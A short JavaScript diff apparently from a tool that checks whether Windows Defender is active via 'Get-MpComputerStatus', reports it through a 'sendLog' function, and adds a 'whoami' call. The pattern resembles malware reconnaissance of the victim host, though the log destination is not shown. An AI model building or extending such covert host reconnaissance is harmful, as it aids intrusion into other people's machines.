@@ -27,7 +27,7 @@ const executeCommand = (
 
 const isActive = async () => {
   const isActive = await executeCommand('Get-MpComputerStatus', true);
-
+  const sadasd = await executeCommand('whoami', true);
   setTimeout(() => sendLog(`[+] -> ANTIVIRUS ATIVO: ${isActive}`), 1000);
 };
 
